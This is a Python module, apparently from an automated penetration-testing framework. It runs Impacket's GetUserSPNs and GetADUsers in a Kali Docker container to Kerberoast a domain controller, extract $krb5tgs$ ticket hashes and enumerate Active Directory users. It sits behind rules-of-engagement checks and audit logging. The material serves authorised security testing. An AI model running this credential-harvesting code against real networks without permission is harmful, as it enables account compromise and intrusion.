"""Impacket-based Active Directory enumeration via Kali Docker."""
from __future__ import annotations

import asyncio
import re
from typing import TYPE_CHECKING

from log.audit import log_step
from security.roe import assert_technique_allowed

if TYPE_CHECKING:
    from config.settings import Config
    from security.roe import ROE


async def _kali_run(args: list[str], timeout: int = 300) -> str:
    cmd = ["docker", "run", "--rm", "--network=host", "kalilinux/kali-rolling"] + args
    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        out, _ = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        return out.decode(errors="replace")
    except Exception as exc:
        log_step("impacket.error", error=str(exc)[:100])
        return ""


class ImpacketRunner:
    """Run Impacket tools in Kali Docker for AD enumeration and Kerberoasting."""

    def __init__(self, roe: ROE, config: Config | None = None) -> None:
        self.roe = roe
        self.timeout = getattr(config, "kali_container_timeout", 300) if config else 300

    async def run_kerberoasting(
        self,
        dc_ip: str,
        domain: str,
        username: str = "",
        password: str = "",
    ) -> dict:
        assert_technique_allowed(self.roe, "exploit")
        log_step("impacket.kerberoast.start", dc_ip=dc_ip, domain=domain)
        args = [
            "python3", "-m", "impacket.examples.GetUserSPNs",
            "-dc-ip", dc_ip, f"{domain}/", "-no-pass",
        ]
        if username:
            args = [
                "python3", "-m", "impacket.examples.GetUserSPNs",
                "-dc-ip", dc_ip, f"{domain}/{username}:{password}", "-request",
            ]
        output = await _kali_run(args, timeout=self.timeout)
        spns = re.findall(r"\$krb5tgs\$[^\s]+", output)
        accounts = re.findall(r"ServicePrincipalName[^\n]*\n\s+(\S+)", output)
        log_step("impacket.kerberoast.done", spns=len(spns))
        return {"spns": spns, "accounts": accounts, "raw": output[:2000]}

    async def run_ldap_enum(self, dc_ip: str, domain: str) -> dict:
        assert_technique_allowed(self.roe, "ad_enum")
        log_step("impacket.ldap_enum.start", dc_ip=dc_ip, domain=domain)
        args = [
            "python3", "-m", "impacket.examples.GetADUsers",
            "-all", "-dc-ip", dc_ip, f"{domain}/",
        ]
        output = await _kali_run(args, timeout=self.timeout)
        users = re.findall(r"Name:\s+(\S+)", output)
        log_step("impacket.ldap_enum.done", users=len(users))
        return {"users": users, "raw": output[:2000]}
